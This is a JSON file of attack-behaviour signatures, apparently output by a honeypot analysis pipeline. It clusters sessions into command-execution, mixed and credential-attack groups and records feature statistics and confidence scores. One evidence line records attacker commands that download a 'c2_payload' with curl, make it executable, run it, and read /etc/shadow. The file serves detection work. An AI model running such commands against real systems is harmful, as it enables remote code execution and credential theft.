@@ -1,0 +1,445 @@
+{
+  "schema_version": "1.0",
+  "generated_at": "2026-10-15T13:47:10.237546+00:00",
+  "signature_count": 3,
+  "signatures": [
+    {
+      "signature_id": "sig-b1feaa1697ecd1bb",
+      "signature_version": "1.0",
+      "cluster_id": 0,
+      "behaviour_label": "Command execution",
+      "session_count": 1,
+      "support_percentage": 1.8519,
+      "feature_profile": {
+        "selected_features": [
+          {
+            "feature": "ackdat",
+            "mean": 0.561605,
+            "median": 0.561605,
+            "std": NaN,
+            "min": 0.561605,
+            "max": 0.561605
+          },
+          {
+            "feature": "ct_dst_ltm",
+            "mean": 54.0,
+            "median": 54.0,
+            "std": NaN,
+            "min": 54.0,
+            "max": 54.0
+          },
+          {
+            "feature": "ct_src_ltm",
+            "mean": 54.0,
+            "median": 54.0,
+            "std": NaN,
+            "min": 54.0,
+            "max": 54.0
+          },
+          {
+            "feature": "ct_srv_dst",
+            "mean": 54.0,
+            "median": 54.0,
+            "std": NaN,
+            "min": 54.0,
+            "max": 54.0
+          },
+          {
+            "feature": "ct_srv_src",
+            "mean": 54.0,
+            "median": 54.0,
+            "std": NaN,
+            "min": 54.0,
+            "max": 54.0
+          },
+          {
+            "feature": "ct_state_ttl",
+            "mean": 1.0,
+            "median": 1.0,
+            "std": NaN,
+            "min": 1.0,
+            "max": 1.0
+          },
+          {
+            "feature": "dbytes",
+            "mean": 337.0,
+            "median": 337.0,
+            "std": NaN,
+            "min": 337.0,
+            "max": 337.0
+          },
+          {
+            "feature": "dinpkt",
+            "mean": 0.131427,
+            "median": 0.131427,
+            "std": NaN,
+            "min": 0.131427,
+            "max": 0.131427
+          }
+        ],
+        "summary": "Representative summary values drawn from cluster-specific statistics."
+      },
+      "command_categories": [
+        "file_system"
+      ],
+      "representative_commands": [
+        "cd /tmp"
+      ],
+      "authentication_profile": {
+        "observed": true,
+        "success_count": 1,
+        "failure_count": 0,
+        "success_rate": 100.0,
+        "notes": "Authentication success/failure observed from session_details.json."
+      },
+      "activity_profile": {
+        "dominant_interpretation": "Command execution",
+        "supporting_sessions": 1,
+        "observed_categories": [
+          "file_system"
+        ],
+        "session_ids": [
+          "4f8484ce537b"
+        ]
+      },
+      "supporting_evidence": [
+        "Observed commands: cd /tmp; Command categories: file_system; Authentication success flag: 1; Session duration: 0.680853"
+      ],
+      "limitations": [
+        "Small sample size: fewer than two supporting sessions."
+      ],
+      "evidence_strength": {
+        "score": 0.76,
+        "label": "Medium",
+        "method": "0.25 + 0.30 * support_ratio + 0.25 * interpretation_consistency + 0.10 * command_evidence + 0.10 * auth_evidence, capped at 1.0"
+      },
+      "confidence": 0.76,
+      "created_at": "2026-10-15T13:47:10.195517+00:00",
+      "source_files": [
+        "data/processed/dec_results.csv",
+        "data/processed/session_mapping.csv",
+        "data/parsed/session_details.json",
+        "data/processed/model_input.csv",
+        "reports/behaviour_analysis/cluster_summary.csv",
+        "reports/behaviour_analysis/cluster_feature_statistics.csv",
+        "reports/behaviour_analysis/cluster_command_analysis.csv",
+        "reports/behaviour_analysis/session_behaviour_profiles.csv"
+      ]
+    },
+    {
+      "signature_id": "sig-7a800a68707bfcfd",
+      "signature_version": "1.0",
+      "cluster_id": 1,
+      "behaviour_label": "Mixed/Unclassified",
+      "session_count": 7,
+      "support_percentage": 12.963,
+      "feature_profile": {
+        "selected_features": [
+          {
+            "feature": "ackdat",
+            "mean": 0.574658,
+            "median": 0.561787,
+            "std": 0.03219117,
+            "min": 0.558807,
+            "max": 0.647275
+          },
+          {
+            "feature": "ct_dst_ltm",
+            "mean": 54.0,
+            "median": 54.0,
+            "std": 0.0,
+            "min": 54.0,
+            "max": 54.0
+          },
+          {
+            "feature": "ct_src_ltm",
+            "mean": 54.0,
+            "median": 54.0,
+            "std": 0.0,
+            "min": 54.0,
+            "max": 54.0
+          },
+          {
+            "feature": "ct_srv_dst",
+            "mean": 54.0,
+            "median": 54.0,
+            "std": 0.0,
+            "min": 54.0,
+            "max": 54.0
+          },
+          {
+            "feature": "ct_srv_src",
+            "mean": 54.0,
+            "median": 54.0,
+            "std": 0.0,
+            "min": 54.0,
+            "max": 54.0
+          },
+          {
+            "feature": "ct_state_ttl",
+            "mean": 1.0,
+            "median": 1.0,
+            "std": 0.0,
+            "min": 1.0,
+            "max": 1.0
+          },
+          {
+            "feature": "dbytes",
+            "mean": 1631.85714286,
+            "median": 1725.0,
+            "std": 159.07171189,
+            "min": 1399.0,
+            "max": 1725.0
+          },
+          {
+            "feature": "dinpkt",
+            "mean": 2.76560157,
+            "median": 2.17517,
+            "std": 1.0083622,
+            "min": 2.05265,
+            "max": 4.277884
+          }
+        ],
+        "summary": "Representative summary values drawn from cluster-specific statistics."
+      },
+      "command_categories": [
+        "reconnaissance",
+        "file_system",
+        "privilege_escalation",
+        "credential_attack",
+        "file_transfer",
+        "networking"
+      ],
+      "representative_commands": [
+        "cat /etc/passwd",
+        "exit",
+        "ls -la",
+        "pwd",
+        "uname -a"
+      ],
+      "authentication_profile": {
+        "observed": true,
+        "success_count": 7,
+        "failure_count": 0,
+        "success_rate": 100.0,
+        "notes": "Authentication success/failure observed from session_details.json."
+      },
+      "activity_profile": {
+        "dominant_interpretation": "Mixed/Unclassified",
+        "supporting_sessions": 7,
+        "observed_categories": [
+          "reconnaissance",
+          "file_system",
+          "privilege_escalation",
+          "credential_attack",
+          "file_transfer",
+          "networking"
+        ],
+        "session_ids": [
+          "88cbfb56c025",
+          "a4c62363d8d6",
+          "1f53fe8bd0ff",
+          "ca8bbbfd6366",
+          "a6c3b1926d4e",
+          "916f7f25e36c",
+          "e6aae1f4915d"
+        ]
+      },
+      "supporting_evidence": [
+        "Observed commands: cat /etc/passwd, exit, ls -la, pwd, uname -a; Command categories: credential_attack, file_system, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 11.224239",
+        "Observed commands: ./payload &, cat /etc/shadow, chmod +x payload, curl http://10.0.0.1/c2_payload > payload, exit; Command categories: file_system, file_transfer, networking, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 21.458934",
+        "Observed commands: cat /etc/passwd, exit, ls -la, pwd, uname -a; Command categories: credential_attack, file_system, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 10.762586",
+        "Observed commands: cat /etc/passwd, exit, ls -la, pwd, uname -a; Command categories: credential_attack, file_system, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 11.383391",
+        "Observed commands: cat /etc/passwd, exit, ls -la, pwd, uname -a; Command categories: credential_attack, file_system, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 11.278874"
+      ],
+      "limitations": [
+        "Behavioural interpretation is mixed or weakly supported by the available evidence."
+      ],
+      "evidence_strength": {
+        "score": 0.9,
+        "label": "High",
+        "method": "0.25 + 0.30 * support_ratio + 0.25 * interpretation_consistency + 0.10 * command_evidence + 0.10 * auth_evidence, capped at 1.0"
+      },
+      "confidence": 0.9,
+      "created_at": "2026-10-15T13:47:10.213160+00:00",
+      "source_files": [
+        "data/processed/dec_results.csv",
+        "data/processed/session_mapping.csv",
+        "data/parsed/session_details.json",
+        "data/processed/model_input.csv",
+        "reports/behaviour_analysis/cluster_summary.csv",
+        "reports/behaviour_analysis/cluster_feature_statistics.csv",
+        "reports/behaviour_analysis/cluster_command_analysis.csv",
+        "reports/behaviour_analysis/session_behaviour_profiles.csv"
+      ]
+    },
+    {
+      "signature_id": "sig-47188a96dccd0950",
+      "signature_version": "1.0",
+      "cluster_id": 2,
+      "behaviour_label": "Credential-attack behaviour",
+      "session_count": 46,
+      "support_percentage": 85.1852,
+      "feature_profile": {
+        "selected_features": [
+          {
+            "feature": "ackdat",
+            "mean": 0.0,
+            "median": 0.0,
+            "std": 0.0,
+            "min": 0.0,
+            "max": 0.0
+          },
+          {
+            "feature": "ct_dst_ltm",
+            "mean": 54.0,
+            "median": 54.0,
+            "std": 0.0,
+            "min": 54.0,
+            "max": 54.0
+          },
+          {
+            "feature": "ct_src_ltm",
+            "mean": 54.0,
+            "median": 54.0,
+            "std": 0.0,
+            "min": 54.0,
+            "max": 54.0
+          },
+          {
+            "feature": "ct_srv_dst",
+            "mean": 54.0,
+            "median": 54.0,
+            "std": 0.0,
+            "min": 54.0,
+            "max": 54.0
+          },
+          {
+            "feature": "ct_srv_src",
+            "mean": 54.0,
+            "median": 54.0,
+            "std": 0.0,
+            "min": 54.0,
+            "max": 54.0
+          },
+          {
+            "feature": "ct_state_ttl",
+            "mean": 1.0,
+            "median": 1.0,
+            "std": 0.0,
+            "min": 1.0,
+            "max": 1.0
+          },
+          {
+            "feature": "dbytes",
+            "mean": 0.0,
+            "median": 0.0,
+            "std": 0.0,
+            "min": 0.0,
+            "max": 0.0
+          },
+          {
+            "feature": "dinpkt",
+            "mean": 0.00854176,
+            "median": 0.0074545,
+            "std": 0.00485655,
+            "min": 0.0,
+            "max": 0.02848
+          }
+        ],
+        "summary": "Representative summary values drawn from cluster-specific statistics."
+      },
+      "command_categories": [],
+      "representative_commands": [
+        "nan"
+      ],
+      "authentication_profile": {
+        "observed": true,
+        "success_count": 0,
+        "failure_count": 46,
+        "success_rate": 0.0,
+        "notes": "Authentication success/failure observed from session_details.json."
+      },
+      "activity_profile": {
+        "dominant_interpretation": "Credential-attack behaviour",
+        "supporting_sessions": 46,
+        "observed_categories": [],
+        "session_ids": [
+          "f462237bf38f",
+          "d71473f8df1f",
+          "ac3d855b1968",
+          "a38c819b1e32",
+          "32869237e7ef",
+          "51fb60d24936",
+          "9d1ef0c58c99",
+          "ee5d28aed1d9",
+          "b05fefef8ce6",
+          "dd221d3d8907",
+          "ef9ae2a7b93e",
+          "89b931c57cf0",
+          "5f63552c8ff9",
+          "4d2398ddaebd",
+          "a97f79dabf58",
+          "e3bf9c0aba5a",
+          "61c8acc77ac0",
+          "b6631a298bbe",
+          "550d7307de41",
+          "4274b92e611f",
+          "beee8328f833",
+          "06023ffe4e8f",
+          "73eae1d369a7",
+          "4ce6f4212524",
+          "735512cb6ad6",
+          "e422abb51310",
+          "bdf3eea00cb2",
+          "8f4b8848e9d4",
+          "0c944d8ff17c",
+          "6f227371a1e8",
+          "0c159145218d",
+          "5a28ab472e4d",
+          "c1f665bb3d28",
+          "c8604f6bc04e",
+          "78a1934b13ae",
+          "549e5293bd98",
+          "6f2f15672ca5",
+          "ccba58b29c45",
+          "9a4ec106110f",
+          "0b7bcca97f3c",
+          "9754d144af49",
+          "3040ed94d428",
+          "76bbeca4b01a",
+          "fd8b54123ea9",
+          "b70abb50f812",
+          "af40e96bfe91"
+        ]
+      },
+      "supporting_evidence": [
+        "Authentication success flag: 0; Session duration: 3.052236",
+        "Authentication success flag: 0; Session duration: 5.033859",
+        "Authentication success flag: 0; Session duration: 1.024292",
+        "Authentication success flag: 0; Session duration: 3.027873",
+        "Authentication success flag: 0; Session duration: 5.025731"
+      ],
+      "limitations": [
+        "No command-category evidence available for this cluster."
+      ],
+      "evidence_strength": {
+        "score": 0.9,
+        "label": "High",
+        "method": "0.25 + 0.30 * support_ratio + 0.25 * interpretation_consistency + 0.10 * command_evidence + 0.10 * auth_evidence, capped at 1.0"
+      },
+      "confidence": 0.9,
+      "created_at": "2026-10-15T13:47:10.236346+00:00",
+      "source_files": [
+        "data/processed/dec_results.csv",
+        "data/processed/session_mapping.csv",
+        "data/parsed/session_details.json",
+        "data/processed/model_input.csv",
+        "reports/behaviour_analysis/cluster_summary.csv",
+        "reports/behaviour_analysis/cluster_feature_statistics.csv",
+        "reports/behaviour_analysis/cluster_command_analysis.csv",
+        "reports/behaviour_analysis/session_behaviour_profiles.csv"
+      ]
+    }
+  ]
+}
